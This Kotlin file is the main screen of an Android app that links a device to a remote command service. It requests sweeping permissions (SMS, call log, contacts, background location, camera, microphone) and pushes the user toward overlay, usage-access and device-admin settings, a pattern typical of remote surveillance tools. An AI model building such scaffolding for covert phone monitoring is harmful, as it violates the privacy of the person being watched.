package com.abuzahra.manager

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.manager.executor.DataCollector
import com.abuzahra.manager.service.CommandService
import com.abuzahra.manager.util.DeviceUtils

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (!DeviceUtils.isLinked(this)) {
            startActivity(Intent(this, LinkActivity::class.java))
            finish()
            return
        }

        val textDeviceId = findViewById<TextView>(R.id.textDeviceId)
        val textStatus = findViewById<TextView>(R.id.textStatus)
        val textBattery = findViewById<TextView>(R.id.textBattery)
        val textPermissions = findViewById<TextView>(R.id.textPermissions)
        val btnPermissions = findViewById<Button>(R.id.btnPermissions)
        val btnUnlink = findViewById<Button>(R.id.btnUnlink)
        val btnRestart = findViewById<Button>(R.id.btnRestart)

        // Update device info
        textDeviceId.text = "ID: ${DeviceUtils.getDeviceId(this)}"

        val deviceInfo = DataCollector.getDeviceInfo(this)
        findViewById<TextView>(R.id.textModel).text = "${deviceInfo["model"]}"
        findViewById<TextView>(R.id.textAndroid).text = "Android ${deviceInfo["android"]}"

        // Update battery
        val battery = DataCollector.getBattery(this)
        textBattery.text = "${battery["level"]}% (${battery["status"]})"

        // Update status
        textStatus.text = "Connected"

        // Ensure service is running
        CommandService.start(this)

        // Update permissions
        updatePermissionCount(textPermissions)

        // Auto-request permissions on first launch
        requestAllPermissions()

        // Request permissions button
        btnPermissions.setOnClickListener {
            requestAllPermissions()
        }

        // Restart service
        btnRestart.setOnClickListener {
            CommandService.stop(this)
            Thread.sleep(500)
            CommandService.start(this)
            textStatus.text = "Service restarted"
            Toast.makeText(this, "Service restarted", Toast.LENGTH_SHORT).show()
        }

        // Unlink
        btnUnlink.setOnClickListener {
            android.app.AlertDialog.Builder(this)
                .setTitle("Unlink Device")
                .setMessage("Are you sure you want to unlink this device?")
                .setPositiveButton("Yes") { _, _ ->
                    DeviceUtils.setLinked(this, false)
                    CommandService.stop(this)
                    startActivity(Intent(this, LinkActivity::class.java))
                    finish()
                }
                .setNegativeButton("Cancel", null)
                .show()
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            val battery = DataCollector.getBattery(this)
            findViewById<TextView>(R.id.textBattery).text = "${battery["level"]}% (${battery["status"]})"
        } catch (_: Exception) {}
    }

    private fun updatePermissionCount(textView: TextView) {
        val total = getRequiredPermissions().size
        var granted = 0
        for (perm in getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                granted++
            }
        }
        textView.text = "Permissions: $granted/$total"
    }

    private fun getRequiredPermissions(): Array<String> {
        val perms = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.VIBRATE,
            Manifest.permission.FLASHLIGHT,
            Manifest.permission.USE_BIOMETRIC,
            Manifest.permission.NFC,
        )
        // Add storage permissions based on SDK
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        } else {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            perms.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        return perms.toTypedArray()
    }

    private fun requestAllPermissions() {
        val permissionsToRequest = mutableListOf<String>()
        for (perm in getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm)
            }
        }
        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toTypedArray(),
                PERMISSION_REQUEST
            )
        } else {
            // Request special permissions
            requestSpecialPermissions()
        }
    }

    private fun requestSpecialPermissions() {
        // Battery optimization
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                )
                startActivity(intent)
            } catch (_: Exception) {}
        }

        // System alert window
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        // Usage stats (for screen time)
        try {
            val appUsageIntent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            startActivity(appUsageIntent)
        } catch (_: Exception) {}

        // Device admin
        try {
            val deviceAdminIntent = Intent(Settings.ACTION_SECURITY_SETTINGS)
            startActivity(deviceAdminIntent)
        } catch (_: Exception) {}
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST) {
            updatePermissionCount(findViewById(R.id.textPermissions))
        }
    }
}
